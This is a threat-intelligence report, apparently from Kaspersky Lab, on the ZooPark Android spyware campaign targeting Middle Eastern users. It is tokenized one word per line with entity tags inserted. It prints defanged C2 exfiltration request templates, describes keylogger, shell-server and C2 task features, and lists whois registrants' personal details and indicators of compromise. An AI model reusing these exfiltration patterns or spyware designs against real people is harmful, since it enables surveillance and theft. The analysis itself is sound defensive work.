We
found
several
news
websites
that
have
been
hacked
by
the
attackers
to
redirect
visitors
to
a
downloading
site
that
serves
malicious
APKs
.

Some
of
the
themes
observed
in
campaign
include
'Kurdistan
referendum
'
,
'TelegramGroups
'
and
'Alnaharegypt
news
'
,
among
others
.

Target
profile
has
evolved
during
the
last
years
of
campaign
,
focusing
on
victims
in
Egypt
,
Jordan
,
Morocco
,
Lebanon
and
Iran
.

2

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Technical
Details

The
malware
used
in
ZooPark B_malware.drop
operations
spans
across
multiple
versions
,
with
the
attackers
including
new
features
in
each
iteration
.

The
following
chart
summarizes
the
main
features
added
in
new
generations
:

Evolution
of
ZooPark B_malware.drop
malware
features

3

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

In
this
section
we
will
detail
the
main
technical
features
of
the
malware
used
in
this
campaign
.

Version
1.0
-
circa
2015

The
first
version
of
the
malware
that
we
found
(
EC5A6F0E743F4B858ABA9DE96A33FB0C
)
is
pretty
simple
.

The
certificate
used
has
been
valid
since
2015
:

Malware
certificate

It
has
only
two
functions
–
stealing
contacts
from
the
address
book
and
accounts
registered
on
the
victim
device
.

The
malware
mimics
a
Telegram
application
:

After
being
manually
launched
,
it
checks
for
an
internet
connection
.

If
unavailable
,
it
only
shows
a
dialog
with
an
alert
in
Farsi
:

دینک
ارجا
ار
ھمانرب
رگید
رابکی
و
هدش
لصتم
تنرتنیا
ھب
افطل
.
'
Please
connect
to
the
internet
and
run
the
program
again
.
'

When
the
connection
is
stable
,
the
malware
sends
a
request
to
the
C2
server
,
encoding
the
stolen
data
(
contacts
and
accounts
)
in
base64
:

4

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

'hxxp://www.rhubarb2[.]com/telg/sv/sv[.]php
'
{
'id
'
:
Base64Encode
(
id
)
,
'data
'
:
Base64Encode
(
contacts
)
}
'hxxp://www.rhubarb2[.]com/get/index[.]php?id=
'
+
Base64Encode
(
'gogo
'
)
+
'
&
user=
'
+
Base64Encode
(
'TelgramGp
'
)
+
'
&
pass=
'
+
Base64Encode
(
'TelgramGp
'
)
+
'
&
data=
'
+
Base64Encode
(
accounts
)
)
This
is
followed
by
the
content
of
the
website
being
displayed
(
not
available
at
the
moment
)
:
'hxxp://www.rhubarb2[.]com/telg/index.php?set=show
'
within
the
app
.

We
found
that
the
content
is
available
in
the
new
server
used
by
the
attackers
(
rhubarb3[.]com B_url.cncsvr
)
:

This
is
a
list
of
Iranian
Telegram
channels
.

Any
additional
channel
can
be
added
to
the
form
above
.

5

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Version
2.0
(
2016
)
-
lightweight
spyware

We
found
that
all
samples
of
this
version
are
signed
by
the
same
debug
certificate
:

Serial
Number
:
0x1

Issuer
:
C=US
,
O=Android
,
CN=Android
Debug

Validity
:
from
=
Mon
May
30
12:44:34
MSK
2016

SHA-1
Fingerprint
:
E2 B_hash
7D I
9A I
46 I
81 I
AD I
65 I
5A I
A1 I
5E I
E7 I
8A I
D7 I
53 I
51 I
90 I
E6 I
C1 I
CA I
FF I

For
this
version
,
every
sample
contains
a
hardcoded
configuration
that
contains
its
C2
address
and
variables
for
use
in
the
request
:

6a388edbce88bb0331ae875ceeb2f319 B_hash

cb67abd070ae188390fc040cbe60e677 B_hash

e2f62b5acf3795a62e9d54e1301c4e7b B_hash

Baseurl

'http://www.rhubarb3.com/ B_url.cncsvr
'
'http://www.rhubarb3.com/ B_url.cncsvr
'
'http://www.rhubarb3.com/ B_url.cncsvr
'
FunctionCode
'none
'
UserLocation
''
'none
'
''
'none
'
''
TypeFile

KeyKey
'
(
ALLINONE
)
'
'
(
Referendum
)
'
'
(
Postrall-SSS
)
'
'dafak
'
'dafak
'
'dafak
'

In
the
table
above
,
the
TypeFile
variable
is
the
application
that
the
malware
mimics
.

This
new
version
is
similar
to
the
previous
.

The
main
difference
is
the
inclusion
of
new
spying
features
such
as
exfiltrate
GPS
location
,
SMS
messages
,
call
logs
and
some
extra
general
information
.

General
information
collected
by
ver.2

6

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Additionally
,
there
is
a
strange
feature
called
'pic
'
.

Pic
feature

This
reads
the
content
of
the
file
'zoo.zoo
'
(
located
on
the
memory
card
,
in
the
picture/photo
path
)
,
encodes
it
with
Base64
and
sends
it
to
the
server
,
removing
the
original
file
.

This
file
is
a
photo
silently
captured
by
the
frontal
camera
,
and
we
believe
it
was
probably
created
by
some
unknown
malware
component
.

One
of
the
samples
(
6A388EDBCE88BB0331AE875CEEB2F319
)
mimics
the
All-in-One
messenger
application
.

After
launch
,
it
only
presents
a
credential
form
if
the
date
on
the
device
is
prior
to
2017.01.01
(
hardcoded
)
.

Otherwise
,
it
just
executes
System.exit
(
)
.

7

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Phishing
form
6A388EDBCE88BB0331AE875CEEB2F319

Obviously
,
after
clicking
the
'Login
'
button
,
credentials
will
be
sent
to
the
C2
server
,
in
a
similar
request
to
that
used
in
version
1.0
:

V1
:

hxxp://www.rhubarb2[.]com/get/index[.]php?id=
'
+
Base64Encode
(
'gogo
'
)
+
'
&
user=
'
+
Base64Encode
(
'TelgramGp
'
)
+
'
&
pass=
'
+
Base64Encode
(
'TelgramGp
'
)
+
'
&
data=
'
+
Base64Encode
(
accounts
)
)

V2
:

hxxp://www.rhubarb3[.]com/get/index[.]php?id=
'
+
Base64Encode
(
'gogo
'
)
+
'
&
user=
'
+
Base64Encode
(
entered_email
)
+
'
&
pass=
'
+
Base64Encode
(
entered_password
)
+
'
&
data=
'
+
Base64Encode
(
'
[
AllInOne
]
'
+
accounts
)

This
seems
to
confirm
that
the
C2
servers
used
by
both
versions
have
a
very
similar
backend
.

8

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Version
3.0
(
2016
)
-
commercial
fork

This
version
of
the
malware
is
especially
interesting
due
to
the
notable
similarities
to
the
commercial
spyware
product
Spymaster
Pro
.

There
are
several
code
similarities
,
with
the
main
difference
being
that
ZooPark B_malware.drop
uses
its
own
command
and
control
server
:

Spymaster
Pro
code
fragment

ZooPark B_malware.drop
code
fragment

From
the
screenshots
above
,
Spymaster
Pro
uses
hxxp://www.spymasterpro[.]com/spyMobile/upload[.]php : B_url.cncsvr
and
ZooPark B_malware.drop
hxxp
:
//*own
C2
server*/
+
/spyMobile/upload.php
.

In
order
to
get
its
C2
address
,
ZooPark B_malware.drop
v3
sends
a
request
to
an
intermediate
server
to
download
a
file
that
looks
like
a
normal
picture
(
androidupdaters[.]com/img.jpg : B_url.cncsvr
)
:

9

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

The
file
looks
like
a
typical
JPG
but
appends
an
IP
address
that
will
be
used
for
the
C2
.

There
are
some
details
that
seem
to
demonstrate
that
ZooPark B_malware.drop
developers
did
not
fully
understand
the
Spymaster
Pro
code
they
were
reusing
.

In
the
case
of
the
SmsReceiver
function
,
we
can
see
how
in
both
implementations
they
use
the
'PASSWORD
'
variable
:

Spymaster
Pro
and
ZooPark B_malware.drop
code
comparison

The
difference
is
that
Spymaster
Pro
uses
this
variable
for
SMS
message
encryption
,
while
ZooPark B_malware.drop
uses
an
own
hardcoded
AES
key
,
so
the
'PASSWORD
'
variable
left
in
the
code
has
no
purpose
.

10

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

All
the
observed
v3
samples
are
signed
by
one
of
the
following
three
certificates
:

Serial
Number

Valid
from

Signed
malware
MD5

0x1
(
debug
)

Jun
19
07:25:37
MSK
2016

7D7AD116E6A42D4E518378E2313E9392 B_hash

0x709decd2

Aug
14
12:52:59
MSK
2016

A7D00C8629079F944B61C4DD5C77C8FB B_hash

AC4402E04DE0949D7BEED975DB84E594 B_hash

0x60b364bc

Apr
14
10:44:04
MSK
2016

B714B092D2F28FCF78EF8D02B46DBF9C  B_hash

This
version
introduces
a
number
of
improvements
compared
to
the
previous
self-developed
versions
:

•
Call
records
(
audio
)
;

•
Browser
data
–
bookmarks
and
history
;

•
Photos
and
pictures
from
memory
card
.

Installed
application
details
;
Version
4.0
(
2017
)
-
modern
spyware

This
malware
variant
represents
a
significant
improvement
on
version
2.0
,
which
seems
to
indicate
that
version
3.0
was
some
kind
of
fork
.

11

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Version
4
malicious
code
structure

Once
again
,
all
observed
samples
are
signed
by
the
same
certificate
,
this
time
valid
since
2017
:

12

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

All
the
samples
represents
backdoored
legitimate
applications
with
malicious
code
injection
:

MD5

Package

ITW
name

519018ecfc50c0cf6cd0c88cc41b2a69 B_hash

ltd.banehappy.drofirewall

FirewallFA.apk

5ad36f6dd060e52771a8e4a1dd90c50c B_hash

free.vpn.proxy.unblock.android.easy.app

DVPNEasy.apk

b44b91b14f176fbf93d998141931a4aa B_hash

com.del.tele.acc

DeleteTelegram.apk

Since
this
version
has
evolved
from
v2
,
its
configuration
is
very
similar
to
the
previous
variant
:

Baseurl

519018ecfc50c0cf6cd0c88cc41b2a69 B_hash

5ad36f6dd060e52771a8e4a1dd90c50c B_hash

b44b91b14f176fbf93d998141931a4aa B_hash

'http://www.rhubarb3.com/ B_url.cncsvr
'
'http://www.rhubarb3.com/ B_url.cncsvr
'
'http://www.rhubarb3.com/ B_url.cncsvr
'
FunctionCode
'none
'
UserLocation
''
'none
'
''
'none
'
''
TypeFile
KeyKey
'
(
FirewallFA
)
'
'
(
VPNEasy
)
'
'
(
DeleteTelegram
)
'
'dafak
'
'dafak
'
'dafak
'

Even
if
the
Baseurl
is
the
address
of
the
C2
server
,
this
is
a
legacy
variable
from
version
2
.

Actually
,
the
main
C2
server
address
is
determined
like
in
version
3
,
by
sending
a
request
to
an
intermediate
server
.

All
the
samples
found
contain
two
encrypted
intermediate
server
addresses
:

13

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

After
decoding
IMAGE_ADDRESSES
the
real
request
would
be
:

Then
the
malware
finds
out
which
of
the
requested
images
contains
a
valid
IP
address
for
the
main
C2
server
,
like
version
3
.

google_logo.jpg

The
main
C2
server
has
an
IP
from
the
same
subnet
as
version
3

The
main
entry
point
for
this
version
is
triggered
by
two
specific
events
:

This
receiver
starts
the
main
malicious
service
called
GooglePlayService
,
which
controls
other
components
.

After
launch
,
it
creates
all
the
working
directories
,
inits
the
database
and
checks
if
the
current
device
is
rooted
by
searching
for
the
following
su
binaries
and
Superuser.apk
:

14

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

It
also
registers
two
additional
receivers
:

They
are
triggered
after
the
device
connection
changes
or
the
screen
turns
on/off
.

In
the
first
case
it
starts
uploading
the
stolen
data
to
the
C2
;
in
the
second
it
processes
preloaded
C2
server
commands
.

This
version
has
a
huge
internal
configuration
containing
dozens
of
parameters
that
regulate
the
malicious
activities
.

This
configuration
can
be
updated
from
the
C2
server
.

Part
of
the
stolen
information
is
stored
in
an
internal
SQL
database
,
called
testunitdb
.

Actually
,
this
version
is
able
to
steal
additional
information
compared
to
version
3
:

•
Browser
data
:
search
history
;

•
Clipboard
data
;

•
Keylogs
;

The
keylogger
implementation
based
on
the
AccessibilityService
is
something
we
have
already
seen
in
other
spyware
families
.

Basically
,
it
listens
for
specific
events
such
as
changing
the
text
of
any
EditText
element
on
the
screen
(
type
=
16
)
,
opening
a
PopupWindow
,
Menu
,
Dialog
,
etc
.

(
for
instance
,
windows
that
may
contain
EditText
fields
(
type
=
32
)
)
.

When
the
second
event
is
found
,
the
malware
initializes
the
keylogger
instance
,
logging
typed
text
and
the
related
contextual
application
name
.

15

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

This
means
the
Keylogger
is
able
to
log
any
typed
credentials
for
any
application
with
system
forms
.

•
Arbitrary
files/folders
;

•
Capturing
photos/videos/audio
;

•
Capturing
screenshots/screen
records
;

•
External
applications
data
–
default
list
:
Telegram
,
WhatsApp
,
IMO
,
Chrome
(
can
be
extended
in
the
configuration
)
.

External
apps
attacked
by
ZooPark B_malware.drop
malware

This
version
also
implements
some
backdoor
functionality
:

•
Shell
command
execution
(
with
or
without
root
)
;

•
Silently
sending
SMSs
;

•
Making
calls
.

Communications
with
C2
server

After
the
malware
obtains
the
main
C2
address
,
it
connects
to
the
C2
server
on
port
6666
.

All
the
transmitted
data
is
encrypted
with
RSA
,
with
its
Java
public
key
file
located
in
\assets\puki
.

It
also
generates
an
AES
key
and
sends
it
to
the
C2
server
for
additional
responses
.

Interestingly
,
the
developers
used
the
'secure
random
'
fix
for
key
generation
:

16

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

This
shows
the
developers
'
concerns
about
cryptography
.

Since
this
attack
is
very
targeted
,
we
can
assume
the
developers
paid
special
attention
to
work
on
outdated
devices
that
are
vulnerable
to
this
'insecure
random
'
attack
.

Here
is
the
scheme
of
client-server
communications
:

Interestingly
,
the
malware
decrypts
and
saves
commands
received
from
its
C2
server
in
files
within
its
own
directory
to
process
them
later
:

17

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

As
mentioned
in
this
code
snippet
,
the
malware
operates
with
'Pac
'
serializable
objects
that
are
used
as
tasks
from
the
server
to
execute
(
when
the
'type
'
value
is
even
)
and
as
report
containers
for
C2
submission
(
when
the
'type
'
value
is
odd
)
.

The
'Pac
'
report
with
the
completed
task
has
a
'type
'
value
+1
compared
to
the
related
task
.

All
reports
are
saved
in
the
'TO_GO
'
directory
.

Here
is
the
full
list
of
possible
tasks
from
the
C2
server
:

Pac
type

Description

Update
malware
with
specified
config
.

Execute
shell
command
with
runtime
.

Zip
specified
file/folder
and
save
it
in
the
'TO_GO
'
directory
.

Write
task
content
in
temporary
zip
file
,
extract
everything
from
it
and
delete
it
.

Copy
specified
file/folder
to
specified
directory
.

Move
specified
file/folder
to
specified
directory
.

Rename
specified
file/folder
.

Delete
specified
file/folder
.

Make
specified
directory
.

Silently
send
SMS
to
specified
number
with
specified
content
.

Make
a
call
to
specific
number
.

Create
a
file
system
tree
of
the
specified
path
and
save
it
in
the
'TO_GO
'
directory
.

Update
intermediate
C2
server
list
(
servers
with
images
)
.

2

4

6

8

10

12

14

16

18

20

22

24

26

The
malware
also
starts
a
shell
server
that
can
execute
commands
without
root
privileges
on
the
victim
device
:

18

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

The
SHELL_SERVER_PORT
value
will
be
submitted
to
the
C2
server
,
so
the
attackers
will
be
able
to
connect
.

19

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Infrastructure
We
have
detected
the
following
infrastructure
used
in
this
campaign
:

Server

Malware
version

Activity
period

Description

entekhab10[.]xp3[.]biz B_url.cncsvr

V.1

2015-2016

Intermediate
server

rhubarb2[.]com B_url.cncsvr

V.1
,
V.2
(
?
)

2015-2016

C2
server/intermediate
server

rhubarb3[.]com B_url.cncsvr

V.2
,
V.4

2016-present

C2
server

androidupdaters[.]com B_url.cncsvr

V.3
,
V.4

2016-present

Intermediate
server
(
image
)

dlgmail[.]com B_url.cncsvr

5.61.27[.]154 B_ip.cncsvr

5.61.27[.]157 B_ip.cncsvr

V.4

V.4

V.3

2016-2017

Intermediate
server
(
image
)

present

present

C2
server

C2
server

The
following
table
summarizes
the
most
interesting
data
from
their
Whois
records
:

androidupdaters[.]com B_url.cncsvr

dlgmail[.]com B_url.cncsvr

rhubarb2[.]com B_url.cncsvr

rhubarb3[.]com B_url.cncsvr

Email
:

asgharkhof@gmail.com

silent.city2020@mail.com

pilton86@yahoo.com

PrivacyProtect

City
,
Street

Tehran
,
saadat
abaad
,
darya
blvd

Tehran
,
valiasr
balatar
az
vanak
k
sharifi
p5
v15

Sanandaj
,
Baharan

PrivacyProtect

Name

parspack
62555

mohammad
hosein
asna
ashar

Mohsen
Malekian

PrivacyProtect

Postal
Code

9865214523

1663976888

6614478527

PrivacyProtect

Phone

+98.2188561212

+98.2188888299

+98.9303938251

PrivacyProtect

IP

178.162.214.146 B_ip.cncsvr

46.4.41.195 B_ip.cncsvr

109.200.28.162 B_ip.cncsvr

5.144.130.33 B_ip.cncsvr

46.4.74.56 B_ip.cncsvr

20

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

rhubarb2[.]com B_url.cncsvr

This
server
was
used
as
C2
server
for
versions
1
and
2
.

Whois
record
:

Registrant
Name
:
نایکلم
نسحم
//Mohsen
Malekian

Registrant
Organization
:

Registrant
Street
:
ناراھب
//Baharan

Registrant
City
:
جدننس
//Sanandaj
(
capital
of
Kurdistan
Province
in
Iran
)

Registrant
State/Province
:

Registrant
Postal
Code
:
6614478527
Registrant
Country
:
IR

Registrant
Phone
:
+98.9303938251

Registrant
Email
:
pilton86@yahoo.com

rhubarb3[.]com B_url.cncsvr

This
server
seems
to
mirror
rhubarb2[.]com B_url.cncsvr
,
including
paths
:

/telg/sv/sv[.]php

/telg/index[.]php

/get/index[.]php

Attackers
relocated
this
C2
domain
from
5.144.130.33 B_ip.cncsvr
(
located
in
Iran
)
to
46.4.74.56
in
July
2017
:

Rhubarb3.com B_url.cncsvr
IP
history

21

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Folders
in
the
open
listing
directory
'/get/main/
'
were
deployed
in
August
2016
,
when
the
domain
was
registered
.

The
timestamp
of
the
Parent
Directory
for
'/images
'
(
Templated.co
web
interface
)
coincides
with
domain
relocation
:

22

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

An
inactive
web
interface
login
page
at
hxxp://www.rhubarb3[.]com/login[.]php
points
to
the
attackers
previous
C2
server
rhubarb2[.]com B_url.cncsvr
:

The
server
's
response
error
discloses
environment
paths
:

<
b
>
Warning
<
/b
>
:
Can
not
modify
header
information
-
headers
already
sent
by
(
output
started
at
/home3/rhubarbc/public_html/get/main/index.php:1
)
in
<
b
>
/home3/rhubarbc/public_html/get/main/index.php</b
>
on
line
<
b
>
6
<
/b
>
<
br
/
>

5.61.27[.]157 B_ip.cncsvr

This
is
the
c2
server
for
malware
version
3
.

As
already
mentioned
,
this
version
is
based
on
the
commercial
product
Spymaster
Pro
,
so
the
server
side
is
similar
.

The
gate
that
handled
requests
from
infected
devices
named
'/spyMobile/
'
is
exactly
the
same
gate
used
by
the
commercial
spyware
product
.

Even
some
commented
HTML
seems
to
come
originally
from
Spymaster
Pro
:

23

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Apparently
'Apasecman
-
Android
KeyLogger
'
was
the
original
name
given
to
this
project
by
the
attackers
.

5.61.27[.]154 B_ip.cncsvr

This
is
C2
server
used
in
the
last
known
version
of
this
malware
.

The
server-side
timestamps
are
also
recent
:

24

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Distribution

We
have
observed
two
main
distribution
vectors
–
telegram
channels
and
watering B_malware.backdoor
holes I
.

Telegram
channels

Several
samples
(
version
1.0
in
this
specific
case
)
mimicked
a
voting
application
for
the
Iranian
Kurdistan
province
:

Inside
the
code
we
found
a
reference
to
the
Telegram
channel
:

String
v3
=
String.valueOf(String.valueOf('ملاس
اب\n
'
)
+
'
ناتسا
نیلانآ
تاباختنا
رازفا
مرن
تفایرد
کنیل
ریز
لاناک
رد
نیلانآ
رامآ
هارمھ
ھب
ناتسدرک\n
'
)
+
'http://telegram.me/entekhab_10\n
'
;

Translation
:

Hi
The
link
to
download
the
election
software
online
in
Kurdistan
province
with
online
statistics
at
the
following
channel
http://telegram.me/entekhab_10 B_url.cncsvr

25

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

https://telegram.me/entekhab_10 B_url.cncsvrs

Polls
for
candidates
in
Kurdistan
province
with
mobile
voting
software

Contact
Admin
:
@
Entekhab_10_Admin

This
channel
was
created
on
November
11
,
2015
with
the
latest
activity
dated
April
5
,
2016
.

It
shows
election
information
among
version
1.0
malware
samples
:

26

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Watering B_malware.backdoor
holes I

We
collected
evidence
that
attackers
deployed
at
least
two
watering B_malware.backdoor
holes I
to
distribute
their
malware
;
in
these
cases
version
3
of
the
malware
was
used
.

alnaharegypt[.]com  B_url.normal

Al-Nahar
is
one
of
the
most
popular
Egyptian
news
sites
,
rated
19th
in
Egypt
by
popularity
according
to
Alexa
.

Below
is
a
page
from
the
site
with
news
about
the
dollar
exchange
rate
on
the
black
market
(
hxxp://www.alnaharegypt.com/t~467369
)
:

27

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Page
infected
with
malicious
iframe

28

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

The
page
had
an
iframe
pointing
to
a
malicious
APK
:

hxxp://showroommontorgueil[.]com/modules/homepageadvertise2/slides/alnaharegypt.news_v2.0[.]apk B_url.cncsvr

It
would
start
downloading
the
malicious
APK
in
Android
without
any
notification
,
though
a
modern
browser
such
as
Chrome
will
notify
the
user
before
starting
the
download
.

The
malicious
APK
name
(
alnaharegypt.news_v2.0.apk
)
mimics
the
waterholed
site
.

We
took
a
closer
look
at
the
site
hosting
the
malicious
APK
file
-
showroommontorgueil[.]com B_url.cncsvr
.

It
was
the
site
of
a
French
fashion
brand
:

Showroommontorgueil.com B_url.cncsvr
state
on
2016-01-16

29

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Despite
the
fact
the
site
is
currently
unavailable
,
based
on
the
watering B_malware.backdoor
hole I
URL
we
can
tell
that
it
was
a
PrestaShop
web
application
.

And
if
we
look
for
serious
security
vulnerabilities
there
is
an
important
one
related
to
file
uploading
.

It
allows
a
remote
attacker
to
upload
an
arbitrary
file
by
abusing
PrestaShop
modules
,
and
as
a
result
take
control
of
the
victim
's
server
.

Moreover
,
there
is
a
list
of
URLs
on
Pastebin
that
look
like
vulnerable
or
already
pawned
PrestaShop
sites
,
and
it
contains
showroommontorgueil.com B_url.cncsvr
:

https://pastebin.com/KuFxy6w5 B_url.normal
-
list
of
probably
uploaded
php
reverse
shell
scripts

And
the
last
point
is
the
cached
deface
state
of
showroommontorgueil.com B_url.normal
hacked
by
Indonesian
Code
Party
:

http://www.zone-h[.]org/mirror/id/26443808?zh=2  B_url.cncsvr

30

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

It
looks
like
the
main
interest
of
this
hacking
group
is
defacing
vulnerable
websites
and
they
are
probably
unrelated
to
the
campaign
actors
.

All
this
suggests
that
showroommontorgueil.com B_url.cncsvr
was
hacked
and
probably
by
multiple
attackers
.

Ordered
events
related
to
the
watering B_malware.backdoor
hole I
deployment
on
alnaharegypt[.]com B_url.normal

alhayatnews[.]com B_ip.cncsvr

This
news
site
is
one
of
the
leading
daily
pan-Arab
newspapers
,
popular
in
Lebanon
and
Jordan
.

According
to
our
telemetry
,
the
malware
was
served
on
2016-09-12
from
:

hxxp://www.alhayatnews[.]com/ArabicRSS[.]apk

annahar[.]com B_url.normal

An-Nahar
is
a
leading
Arabic
daily
newspaper
published
in
Lebanon
.

We
found
some
traces
suggesting
that
maybe
there
was
a
watering B_malware.backdoor
hole I
on
their
site
,
though
we
can
́t
confirm
this
.

In
particular
,
one
of
the
samples
(
ac4402e04de0949d7beed975db84e594
)
mimics
the
AnNahar
official
mobile
application
,
which
makes
us
believe
the
malware
was
probably
distributed
in
a
similar
way
through
the
legitimate
site
.

31

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

https://play.google.com/store/apps/details?id=com.ann.newspaper B_url.normal

Legitimate
app
that
malware
mimics
32
Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Victims

Some
of
the
analyzed
samples
provide
clues
about
the
intended
targets
for
this
campaign
.

For
instance
,
the
sample
CB67ABD070AE188390FC040CBE60E677
mimics
a
voting
application
for
the
independence
referendum
in
Kurdistan
:

Clicking
it
will
show
an
image
used
by
Kurdish
referendum
supporters
and
offer
different
voting
options
:

Other
possible
high-profile
targets
include
the
United
Nations
Relief
and
Works
Agency
for
Palestine
Refugees
in
the
Near
East
(
UNRWA
)
in
Amman
,
Jordan
.

33

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Conclusions

From
the
technical
point
of
view
,
the
evolution
of
ZooPark B_malware.drop
has
shown
notable
progress
:
from
the
very
basic
first
and
second
versions
,
the
commercial
spyware
fork
in
its
third
version
and
then
to
the
complex
spyware
that
is
version
4
.

This
last
step
is
especially
interesting
,
showing
a
big
leap
from
straightforward
code
functionality
to
highly
sophisticated
malware
.

This
suggests
the
latest
version
may
have
been
bought
from
vendors
of
specialist
surveillance
tools
.

That
would
n't
be
surprising
,
as
the
market
for
these
espionage
tools
is
growing
,
becoming
popular
among
governments
,
with
several
known
cases
in
the
Middle
East
.

Also
,
choosing
mobile
platforms
for
espionage
campaigns
is
just
a
natural
evolutionary
step
.

At
this
point
,
we
can
not
confirm
attribution
to
any
known
actor
.

If
you
would
like
to
learn
more
about
our
intelligence
reports
or
request
more
information
on
a
specific
report
,
contact
us
at
:
intelreports@kaspersky.com
.

34
Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

Appendix  B_hash
-
Indicators
of
compromise

Malware
samples

MD5

Version
1.0

Filename

232BD3DDE6914DB0A3DBFC21ED178887 B_hash

Entekhab10
V1.apk

5EFDDD7F0FC2125E78A2CA18B68464EC B_hash

Entekhab10-v3.apk

EC5A6F0E743F4B858ABA9DE96A33FB0C B_hash

TelegramGroups.apk

Version
2.0

6A388EDBCE88BB0331AE875CEEB2F319 B_hash

AllInOne.apk

E2F62B5ACF3795A62E9D54E1301C4E7B B_hash

<
unknown
>

CB67ABD070AE188390FC040CBE60E677 B_hash

Referendum
Kurdistan.apk

699A7EEDD244F402303BCFFDEE1F0ED1 B_hash

<
unknown
>

Version
3.0

7D7AD116E6A42D4E518378E2313E9392 B_hash

Sexy_wallpaper.apk

A7D00C8629079F944B61C4DD5C77C8FB B_hash

ArabicRSS.apk

AC4402E04DE0949D7BEED975DB84E594 B_hash

com.ann.newspaper.apk

B714B092D2F28FCF78EF8D02B46DBF9C B_hash

Alnaharegypt.news_v2.0.apk

familyinnovation_app.apk

Version
4.0

519018ECFC50C0CF6CD0C88CC41B2A69 B_hash

FirewallFA.apk

5AD36F6DD060E52771A8E4A1DD90C50C B_hash

DVPNEasy.apk

B44B91B14F176FBF93D998141931A4AA B_hash

DeleteTelegram.apk

35

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

C2
servers

entekhab10[.]xp3[.]biz B_url.cncsvr

androidupdaters[.]com B_url.cncsvr

dlgmail[.]com B_url.cncsvr

rhubarb2[.]com B_url.cncsvr

rhubarb3[.]com B_url.cncsvr

5.61.27[.]154 B_ip.cncsvr

5.61.27[.]157 B_ip.cncsvr

watering B_malware.backdoor
holes I

hxxp://www.alnaharegypt[.]com/t~467369 B_url.cncsvr
-
>

hxxp://showroommontorgueil[.]com/modules/homepageadvertise2/slides/alnaharegypt.news_v2.0[.]apk B_url.cncsvr

hxxp://www.alhayatnews[.]com/ArabicRSS[.]apk B_url.cncsvr

36

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.
